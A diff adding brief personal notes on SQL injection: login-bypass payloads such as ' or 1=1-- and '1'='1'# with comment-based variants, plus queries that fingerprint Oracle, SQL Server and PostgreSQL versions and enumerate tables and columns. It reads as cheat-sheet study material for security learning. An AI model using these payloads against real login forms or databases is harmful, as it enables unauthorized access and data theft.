@@ -1,0 +1,25 @@
+
+sql injection can be performed on a login page as well 
+
+ex :- SELECT * from users where username = 'admin' and password = 'admin123' Code will be like this --> SELECT * from users where username = 'admin' and password = 'admin123' or 1=1--'
+ or it can be like this --> SELECT * from users where username = 'admin' and password = 'admin123' or '1'='1'--'
+ or it can be like this --> SELECT * from users where username = 'admin' and password = 'admin123' or '1'='1'#
+ or it can be like this --> SELECT * from users where username = 'admin' and password = 'admin123' or '1'='1'/*
+ or it can be like this --> SELECT * from users where username = 'admin' # ' and password = 'admin123' or 1=1 --'
+ or it can be like this --> SELECT * from users where username = 'admin' order by 1--'
+
+
+
+Oracle	SELECT banner FROM v$version
+SELECT version FROM v$instance
+Microsoft	SELECT @@version
+PostgreSQL	SELECT version()
+
+SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+
+Oracle	SELECT * FROM all_tables
+SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
+
+Microsoft	SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
